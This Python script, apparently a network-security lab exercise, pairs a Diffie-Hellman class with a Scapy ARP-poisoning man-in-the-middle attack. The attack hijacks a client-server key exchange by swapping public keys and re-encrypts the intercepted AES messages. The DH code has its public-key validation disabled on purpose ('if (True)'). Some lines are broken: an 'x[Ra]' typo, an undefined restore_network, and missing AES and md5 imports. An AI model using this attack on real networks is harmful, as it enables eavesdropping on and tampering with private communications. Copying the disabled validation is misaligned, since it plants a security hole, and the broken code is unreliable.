from scapy.all import *
import os
import signal
import sys
import threading
import time
import base64

# !/usr/bin/env python
"""
PyDHE - Diffie-Hellman Key Exchange in Python
Copyright (C) 2015 by Mark Loiseau

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

import hashlib
from binascii import hexlify  # For debug output

# If a secure random number generator is unavailable, exit with an error.
try:
    import ssl

    random_function = ssl.RAND_bytes
    random_provider = "Python SSL"
except (AttributeError, ImportError):
    import OpenSSL

    random_function = OpenSSL.rand.bytes
    random_provider = "OpenSSL"


class DiffieHellman(object):
    """
    A reference implementation of the Diffie-Hellman protocol.
    By default, this class uses the 6144-bit MODP Group (Group 17) from RFC 3526.
    This prime is sufficient to generate an AES 256 key when used with
    a 540+ bit exponent.
    """

    def __init__(self, generator=2, group=5, keyLength=540):
        """
        Generate the public and private keys.
        """
        min_keyLength = 180
        default_keyLength = 540

        default_generator = 2
        valid_generators = [2, 3, 5, 7]

        # Sanity check fors generator and keyLength
        if (generator not in valid_generators):
            print("Error: Invalid generator. Using default.")
            self.generator = default_generator
        else:
            self.generator = generator

        if (keyLength < min_keyLength):
            print("Error: keyLength is too small. Setting to minimum.")
            self.keyLength = min_keyLength
        else:
            self.keyLength = keyLength

        self.prime = self.getPrime(group)

        self.privateKey = self.genPrivateKey(keyLength)
        self.publicKey = self.genPublicKey()

    def getPrime(self, group=5):
        """
        Given a group number, return a prime.
        """
        default_group = 5

        primes = {
            5: 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF,
            14: 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF,
            15: 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A93AD2CAFFFFFFFFFFFFFFFF,
            16: 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FBECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C934063199FFFFFFFFFFFFFFFF,
            17:
                0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FBECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C93402849236C3FAB4D27C7026C1D4DCB2602646DEC9751E763DBA37BDF8FF9406AD9E530EE5DB382F413001AEB06A53ED9027D831179727B0865A8918DA3EDBEBCF9B14ED44CE6CBACED4BB1BDB7F1447E6CC254B332051512BD7AF426FB8F401378CD2BF5983CA01C64B92ECF032EA15D1721D03F482D7CE6E74FEF6D55E702F46980C82B5A84031900B1C9E59E7C97FBEC7E8F323A97A7E36CC88BE0F1D45B7FF585AC54BD407B22B4154AACC8F6D7EBF48E1D814CC5ED20F8037E0A79715EEF29BE32806A1D58BB7C5DA76F550AA3D8A1FBFF0EB19CCB1A313D55CDA56C9EC2EF29632387FE8D76E3C0468043E8F663F4860EE12BF2D5B0B7474D6E694F91E6DCC4024FFFFFFFFFFFFFFFF,
            18:
                0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FBECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C93402849236C3FAB4D27C7026C1D4DCB2602646DEC9751E763DBA37BDF8FF9406AD9E530EE5DB382F413001AEB06A53ED9027D831179727B0865A8918DA3EDBEBCF9B14ED44CE6CBACED4BB1BDB7F1447E6CC254B332051512BD7AF426FB8F401378CD2BF5983CA01C64B92ECF032EA15D1721D03F482D7CE6E74FEF6D55E702F46980C82B5A84031900B1C9E59E7C97FBEC7E8F323A97A7E36CC88BE0F1D45B7FF585AC54BD407B22B4154AACC8F6D7EBF48E1D814CC5ED20F8037E0A79715EEF29BE32806A1D58BB7C5DA76F550AA3D8A1FBFF0EB19CCB1A313D55CDA56C9EC2EF29632387FE8D76E3C0468043E8F663F4860EE12BF2D5B0B7474D6E694F91E6DBE115974A3926F12FEE5E438777CB6A932DF8CD8BEC4D073B931BA3BC832B68D9DD300741FA7BF8AFC47ED2576F6936BA424663AAB639C5AE4F5683423B4742BF1C978238F16CBE39D652DE3FDB8BEFC848AD922222E04A4037C0713EB57A81A23F0C73473FC646CEA306B4BCBC8862F8385DDFA9D4B7FA2C087E879683303ED5BDD3A062B3CF5B3A278A66D2A13F83F44F82DDF310EE074AB6A364597E899A0255DC164F31CC50846851DF9AB48195DED7EA1B1D510BD7EE74D73FAF36BC31ECFA268359046F4EB879F924009438B481C6CD7889A002ED5EE382BC9190DA6FC026E479558E4475677E9AA9E3050E2765694DFC81F56E880B96E7160C980DD98EDD3DFFFFFFFFFFFFFFFFF
        }

        if group in primes.keys():
            return primes[group]
        else:
            print("Error: No prime with group %i. Using default." % group)
            return primes[default_group]

    def genRandom(self, bits):
        """
        Generate a random number with the specified number of bits
        """
        _rand = 0
        _bytes = bits // 8 + 8

        while (_rand.bit_length() < bits):
            try:
                # Python 3
                _rand = int.from_bytes(random_function(_bytes), byteorder='big')
            except:
                # Python 2
                _rand = int(OpenSSL.rand.bytes(_bytes).encode('hex'), 16)

        return _rand

    def genPrivateKey(self, bits):
        """
        Generate a private key using a secure random number generator.
        """
        return self.genRandom(bits)

    def genPublicKey(self):
        """
        Generate a public key X with g**x % p.
        """
        return pow(self.generator, self.privateKey, self.prime)

    def checkPublicKey(self, otherKey):
        """
        Check the other party's public key to make sure it's valid.
        Since a safe prime is used, verify that the Legendre symbol == 1
        """
        if (otherKey > 2 and otherKey < self.prime - 1):
            if (pow(otherKey, (self.prime - 1) // 2, self.prime) == 1):
                return True
        return False

    def genSecret(self, privateKey, otherKey):
        """
        Check to make sure the public key is valid, then combine it with the
        private key to generate a shared secret.
        """
        if (True):
            sharedSecret = pow(otherKey, privateKey, self.prime)
            return sharedSecret
        else:
            raise Exception("Invalid public key.")

    def genKey(self, otherKey):
        """
        Derive the shared secret, then hash it to obtain the shared key.
        """
        self.sharedSecret = self.genSecret(self.privateKey, otherKey)

        # Convert the shared secret (int) to an array of bytes in network order
        # Otherwise hashlib can't hash it.
        try:
            _sharedSecretBytes = self.sharedSecret.to_bytes(
                self.sharedSecret.bit_length() // 8 + 1, byteorder="big")
        except AttributeError:
            _sharedSecretBytes = str(self.sharedSecret)

        s = hashlib.sha256()
        s.update(bytes(_sharedSecretBytes))
        self.key = s.digest()

    def getKey(self):
        """
        Return the shared secret key
        """
        return self.key

    def showParams(self):
        """
        Show the parameters of the Diffie Hellman agreement.
        """
        print("Parameters:")
        print("Prime[{0}]: {1}".format(self.prime.bit_length(), self.prime))
        print("Generator[{0}]: {1}\n".format(self.generator.bit_length(),
                                             self.generator))
        print("Private key[{0}]: {1}\n".format(self.privateKey.bit_length(),
                                               self.privateKey))
        print("Public key[{0}]: {1}".format(self.publicKey.bit_length(),
                                            self.publicKey))

    def showResults(self):
        """
        Show the results of a Diffie-Hellman exchange.
        """
        print("Results:")
        print("Shared secret[{0}]: {1}".format(self.sharedSecret.bit_length(),
                                               self.sharedSecret))
        print("Shared key[{0}]: {1}".format(len(self.key), hexlify(self.key)))


if __name__ == "__main__":
    """
    Run an example Diffie-Hellman exchange
    """
    me_server = DiffieHellman()
    me_client = DiffieHellman()
    server = DiffieHellman()
    client = DiffieHellman()
    
    print("from server to client")
    print(me_client.publicKey)
    print("")
    print("from client to server")
    print(me_server.publicKey)

    
#    print("me-client:")
#    me_client.showParams()
#    print("")
#    
#    print("me-server:")
#    me_server.showParams()
#    print("")

#    
#    print("keys:-------")
#    print("me_client: " , hexlify(me_client.key))
#    print("client: " , hexlify(client.key))
#    print("")
#    print("me_server: " , hexlify(server.key))
#    print("server: " , hexlify(server.key))

#	a.showResults()
#	b.showParams()
#	b.showResults()
#
#	if(a.getKey() == b.getKey()):
#		print("Shared keys match.")
#		print("Key:", hexlify(a.key))
#	else:
#		print("Shared secrets didn't match!")
#		print("Shared secret A: ", a.genSecret(b.publicKey))
#		print("Shared secret B: ", b.genSecret(a.publicKey))
#

# ARP Poison parameters
server_ip = "192.168.0.1"
client_ip = "192.168.0.2"
packet_count = 1000
conf.iface = "nshw3-bridge"
conf.verb = 0


# Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
# an ARP reply with MAC Address
def get_mac(ip_address):
    # ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    # Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s, r in resp:
        return r[ARP].hwsrc
    return None


# Keep sending false ARP replies to put our machine in the middle to intercept packets
# This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(server_ip, server_mac, client_ip, client_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=client_ip))
            send(ARP(op=2, pdst=client_ip, hwdst=client_mac, psrc=server_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(server_ip, server_mac, client_ip, client_mac)

def AESdecrypt(string,key):
    aeskey = hashlib.md5(key).hexdigest()
    enc = base64.b64decode(string)
    iv = enc[:AES.block_size]
    cipher = AES.new(aeskey, AES.MODE_CBC, iv)
    return cipher.decrypt(enc[AES.block_size:]).decode('utf-8')

def AESencrypt(string , key):
    aeskey = md5(key).hexdigest()
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(aeskey , AES.MODE_CBC , iv)
    return b64encode(iv + cipher.encrypt(string.encode()))

def getkey(dhkey):
    bs =[]
    
    while dhkey!=0:
        bs.append(dhkey & 0xFF)
        dhkey >>=8
    
    sharedSecretBytes = bytes(bytearray(reversed(bs)))
    s = hashlib.sha256()
    s.update(bytes(sharedSecretBytes))
    return s.digest()

def print_summary(x):


    try:
        

        if x[IP].dst == server_ip:
            x[Ether].dst = server_mac

        if x[IP].dst == client_ip:
            x[Ether].dst = client_mac
        
        if x[IP].src == server_ip and  str(x[TCP].flags)=="24":
            if "keyexchange" in x[Raw].load:

                start=str(x[Raw].load).find("publicKey")+13
                end=str(x[Raw].load).find("}}")-1
                
                me_server.genKey(long(str(x[Raw].load)[start:end]))

                
                x[Raw].load='{"dh-keyexchange":{"generator": "2","prime": "2410312426921032588552076022197566074856950548502459942654116941958108831682612228890093858261341614673227141477904012196503648957050582631942730706805009223062734745341073406696246014589361659774041027169249453200378729434170325843778659198143763193776859869524088940195577346119843545301547043747207749969763750084308926339295559968882457872412993810129130294592999947926365264059284647209730384947211681434464714438488520940127459844288859336526896320919633919","publicKey": "'+str(me_client.publicKey)+'"}}'
        
            if "==" in x[Raw].load:
                print("SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSbefor")
                print(int(hexlify(me_server.key),16))
                print(str(x[Raw].load))
                x[Ra].load=AESencrypt(AESdecrypt(str(x[Raw].load),getkey(int(hexlify(me_server.key),16))),getkey(int(hexlify(me_client.key),16)))
                print("SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSafter")
                print(str(x[Raw].load))


        
        if x[IP].src == client_ip and  str(x[TCP].flags)=="24":
            if "keyexchange" in x[Raw].load:
#                print("real load")
#                print(x[Raw].load)
#                
#                print("fake load")
                x[Raw].load='{"dh-keyexchange":{"publicKey": "'+str(me_server.publicKey)+'"}}'
#                print(x[Raw].load)

                start=str(x[Raw].load).find("publicKey")+13
                end=str(x[Raw].load).find("}}")-1
                
                me_client.genKey(long(str(x[Raw].load)[start:end]))

#            print(str(x[TCP].flags))
#            print(int(x[TCP].flags))
#            print(type(x[TCP].flags))
#            print(str(x[TCP].flags)=="24")

        

        del x[IP].chksum
        del x[TCP].chksum

        sendp(x, iface=conf.iface)
#        print(x.sprintf("Flags: %TCP.flags%, \n"
#                    "IP Source: %IP.src%, \n"
#                    "IP Dest: %IP.dst%, \n"
#                    "Ether Source %Ether.src%, \n"
#                    "Ether Dest %Ether.dst%, \n"
#                    "%Raw.load% \n"))

    except Exception as e:
            print(e)


server_mac = get_mac(server_ip)
if server_mac is None:
    print("[!] Unable to get server MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] server MAC address: " + server_mac)

client_mac = get_mac(client_ip)
if client_mac is None:
    print("[!] Unable to get client MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] client MAC address: " + client_mac)

# ARP poison thread
poison_thread = threading.Thread(target=arp_poison, args=(server_ip, server_mac, client_ip, client_mac))
poison_thread.start()


# Sniff traffic and write to file. Capture is filtered on client machine

try:
    sniff_filter = "ip host " + client_ip

    packets = sniff(filter=sniff_filter, prn=print_summary, iface=conf.iface, count=packet_count)
        
    print("[*] Stopping network capture..Restoring network")
    
except KeyboardInterrupt:
    print("[*] Stopping network capture..Restoring network")
    sys.exit(0)


